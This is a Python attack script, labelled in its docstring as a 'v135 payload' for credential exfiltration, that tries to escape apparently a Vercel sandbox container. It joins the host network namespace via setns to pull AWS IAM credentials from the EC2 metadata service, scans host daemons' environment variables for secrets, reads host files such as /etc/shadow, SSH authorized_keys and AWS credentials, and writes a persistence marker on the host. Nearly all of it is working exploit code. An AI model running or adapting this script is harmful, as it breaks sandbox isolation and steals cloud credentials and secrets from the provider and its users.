# -*- coding: utf-8 -*-
"""v135 payload: setns host netns -> EC2 IMDS + celld environ + host rootfs 敏感文件 + 挂载类型
目标: brokered credentials exfil / host 信息
输出 /vercel/sandbox/v135c.out"""
import socket, struct, time, json, os, signal, ctypes, urllib.request

OUT = '/vercel/sandbox/v135c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)

CELL = '/run/cell/cell.sock'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def scan_shims():
    out = []
    try:
        for d in os.listdir('/proc'):
            if d.isdigit():
                try:
                    if open('/proc/%s/comm' % d).read().strip() == 'containerd-shim':
                        out.append(int(d))
                except Exception:
                    pass
    except Exception:
        pass
    return out


def read_proc(pid, fname, n=4000):
    try:
        return open('/proc/%d/%s' % (pid, fname), 'rb').read(n)
    except Exception as e:
        return b'EXC %s' % str(e).encode()


def http_req(url, method='GET', headers=None, timeout=5):
    try:
        req = urllib.request.Request(url, method=method, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(4000)
    except Exception as e:
        return 'EXC %s' % type(e).__name__, str(e).encode()


# 0: 找 host shim pid（非我们 sandbox 的、非特权容器的）
log('=== 0 find host shim ===')
shims = scan_shims()
log('shims: %s' % shims)
target = None
for p in shims:
    cmd = read_proc(p, 'cmdline', 500).replace(b'\x00', b' ')
    log('shim %d: %r' % (p, cmd.decode(errors='replace')))
    if b'ctr_' in cmd:
        target = p
log('target host shim (ctr_xxx) = %s' % target)
if not target:
    target = shims[-1] if shims else None

# 1: host 网络接口（通过 shim 的 net proc）
log('=== 1 host net ifaces ===')
if target:
    try:
        log('net/dev:\n' + read_proc(target, 'net/dev', 3000).decode(errors='replace'))
    except Exception as e:
        log('net/dev EXC %s' % e)
    try:
        log('net/route:\n' + read_proc(target, 'net/route', 2000).decode(errors='replace'))
    except Exception as e:
        log('net/route EXC %s' % e)

# 2: setns host netns -> IMDS
log('=== 2 setns + IMDS ===')
if target:
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        fd = os.open('/proc/%d/ns/net' % target, os.O_RDONLY)
        r = libc.setns(ctypes.c_int(fd), ctypes.c_int(0))
        err = ctypes.get_errno()
        log('setns rc=%d errno=%d' % (r, err))
        if r == 0:
            log('setns OK, host netns!')
            # 确认网络变了：看本机 IP/接口
            try:
                log('ifconfig-ish: ' + read_proc(os.getpid(), 'net/dev', 2000).decode(errors='replace'))
            except Exception:
                pass
            for url in [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/meta-data/instance-id',
                'http://169.254.169.254/1.0/meta-data/',
            ]:
                st, body = http_req(url, timeout=4)
                log('IMDS GET %s -> %s %r' % (url, st, body[:800]))
            # IMDSv2 token
            st, body = http_req('http://169.254.169.254/latest/api/token', method='PUT',
                                headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}, timeout=4)
            log('IMDSv2 PUT token -> %s %r' % (st, body[:200]))
            if st == 200:
                tok = body.decode().strip()
                st, body = http_req('http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                                    headers={'X-aws-ec2-metadata-token': tok}, timeout=4)
                log('IMDSv2 GET creds -> %s %r' % (st, body[:1500]))
            # 恢复原 netns（读我们自己的）
            # 注: setns 后 socket 已经换 net，恢复需要保存原 fd——这里直接继续
        else:
            log('setns failed errno=%d' % err)
    except Exception as e:
        log('setns EXC %s' % e)

# 3: celld/containerd/sandboxctrl environ
log('=== 3 host proc environ ===')
for pid, name in [(1, 'celld'), (490, 'containerd'), (534, 'sandboxctrl')]:
    env = read_proc(pid, 'environ', 6000)
    log('%s(%d) environ: %r' % (name, pid, env[:2000].decode(errors='replace').replace('\x00', ' | ')))
    # 找敏感 key
    for kw in [b'AWS', b'TOKEN', b'SECRET', b'KEY', b'PASS', b'CRED']:
        if kw in env:
            log('  FOUND %s in %s environ' % (kw.decode(), name))

# 4: host rootfs 敏感文件
log('=== 4 host fs ===')
if target:
    R = '/proc/%d/root' % target
    for p in ['opt/vercel', 'root', 'etc', 'home', 'srv', 'var/lib', 'var/run', 'usr/local']:
        try:
            ls = os.listdir('%s/%s' % (R, p))[:40]
            log('ls %s/ = %s' % (p, ls))
        except Exception as e:
            log('ls %s/ EXC %s' % (p, e))
    for fp in ['etc/passwd', 'etc/shadow', 'etc/hostname', 'etc/hosts', 'etc/resolv.conf',
               'root/.ssh/authorized_keys', 'root/.aws/credentials', 'root/.aws/config',
               'opt/vercel/celld.json', 'opt/vercel/config.json', 'opt/vercel/config.yaml',
               'opt/vercel/cell.yaml', 'etc/containerd/config.toml', 'var/lib/cloud/instance/instance-id']:
        try:
            data = open('%s/%s' % (R, fp), 'rb').read(3000)
            log('FILE %s: %r' % (fp, data[:800]))
        except Exception as e:
            log('FILE %s EXC %s' % (fp, e))
    # mountinfo 确认 rootfs 类型
    try:
        mi = read_proc(target, 'mountinfo', 6000).decode(errors='replace')
        for line in mi.splitlines():
            if ' / ' in line and ' / ' in line[line.find(' - '):] is False or '/ - ' in line:
                log('MOUNT %s' % line[:300])
        log('mountinfo len=%d' % len(mi))
        for line in mi.splitlines()[:30]:
            log('MI %s' % line[:250])
    except Exception as e:
        log('mountinfo EXC %s' % e)
    # 持久性: 写 marker 读回
    try:
        with open('%s/tmp/V135M' % R, 'w') as mf:
            mf.write('v135-persist-%d' % os.getpid())
        log('wrote tmp/V135M, readback=%r' % open('%s/tmp/V135M' % R).read())
    except Exception as e:
        log('write test EXC %s' % e)

log('V135_DONE')
f.close()
